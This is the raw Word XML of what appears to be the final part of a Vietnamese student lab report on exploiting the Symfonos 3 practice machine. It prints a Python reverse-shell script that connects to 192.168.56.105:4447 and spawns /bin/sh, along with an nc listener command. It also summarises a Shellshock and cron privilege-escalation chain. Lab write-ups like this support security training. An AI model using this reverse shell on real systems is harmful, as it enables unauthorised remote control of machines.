              <w:t>.SOCK_STREAM)</w:t>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>s.connect</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(("192.168.56.1</w:t>
            </w:r>
            <w:r w:rsidR="00766757">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>05</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>",4447))</w:t>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>os.dup</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2(</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>s.fileno</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(),0)</w:t>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>os.dup</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2(</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>s.fileno</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(),1)</w:t>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>os.dup</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2(</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>s.fileno</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(),2)</w:t>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">p = </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>subprocess.call</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(["/bin/sh","-i"])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EA18C45" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00C81D4F">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="668EFAD8" w14:textId="4CA30235" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Script tạo socket TCP kết nối đến 192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0091444A">
        <w:t>05</w:t>
      </w:r>
      <w:r>
        <w:t>:4447, chuyển hướng stdin, stdout và stderr qua socket rồi mở /bin/sh ở chế độ tương tác. File này được đặt vào vị trí phù hợp với tiến trình định kỳ đã phát hiện bằng pspy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D393C1E" w14:textId="77777777" w:rsidR="0091444A" w:rsidRDefault="00766757">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="33331B14" wp14:editId="0046B8DF">
            <wp:extent cx="6153785" cy="1133475"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="44425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9381" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1133475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="517B4761" w14:textId="4AA2886D" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Mở cổng lắng nghe 4447 trên Kali và chờ tiến trình đặc quyền gọi script.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016E3B45" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE4702C" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nc -nlvp 4447</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B04B55" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Khi tiến trình định kỳ có quyền cao thực thi python.py, máy mục tiêu kết nối ngược về cổng 4447. Quyền của shell nhận được phụ thuộc vào tài khoản đã chạy tiến trình đó.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2046F14B" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Kết quả/nhận xét: </w:t>
      </w:r>
      <w:r>
        <w:t>Nếu lệnh id hoặc whoami trong phiên shell mới trả về uid=0 hoặc root, quá trình leo thang đặc quyền đã thành công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABB6A1C" w14:textId="44671460" w:rsidR="00C81D4F" w:rsidRDefault="0091444A">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41859326" wp14:editId="43524822">
            <wp:extent cx="6153785" cy="4726305"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="667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627" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="4726305"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E272D0" w14:textId="220DE14C" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Quá trình thực hiện đi từ dò quét mạng, liệt kê thư mục web, phát hiện endpoint CGI, khai thác Shellshock để có reverse shell, theo dõi lưu lượng loopback, chuyển sang tài khoản hades và sử dụng pspy để phát hiện tiến trình định kỳ. Cuối cùng, script reverse shell được chuẩn bị để tận dụng tiến trình có quyền cao và kiểm tra khả năng đạt quyền root. </w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00C81D4F" w:rsidSect="00034616">
      <w:footerReference w:type="default" r:id="rId28"/>
      <w:pgSz w:w="12240" w:h="15840"/>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C9D05" w14:textId="77777777" w:rsidR="00FA13AE" w:rsidRDefault="00FA13AE">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="562A2EBE" w14:textId="77777777" w:rsidR="00FA13AE" w:rsidRDefault="00FA1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97BB" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve">Trang </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText>PAGE</w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00F812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7F3E5" w14:textId="77777777" w:rsidR="00FA13AE" w:rsidRDefault="00FA13AE">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="76E1FFB4" w14:textId="77777777" w:rsidR="00FA13AE" w:rsidRDefault="00FA1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683838">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1827892316">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="463742673">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="491064053">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1487817704">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="253632283">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="937758757">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1631548009">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="41964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92"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00317D2B"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003D2EF6"/>
    <w:rsid w:val="00584E6B"/>
    <w:rsid w:val="00766757"/>
    <w:rsid w:val="0091444A"/>
    <w:rsid w:val="00933316"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C81D4F"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F81291"/>
    <w:rsid w:val="00FA13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DC60F"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{78915871-E388-4659-BC68-606DCA52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xBk50_2vt5ifhvoCKHA7eSNTzd7f29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Symfonos 3 Enumeration and Exploitation</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Manager/>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>7504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Symfonos 3 Enumeration and Exploitation</dc:title>
  <dc:subject>Báo cáo thực hành kiểm thử bảo mật trong môi trường lab</dc:subject>
  <dc:creator/>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>Tran Manh Duc 20230247P</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-26T11:04:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>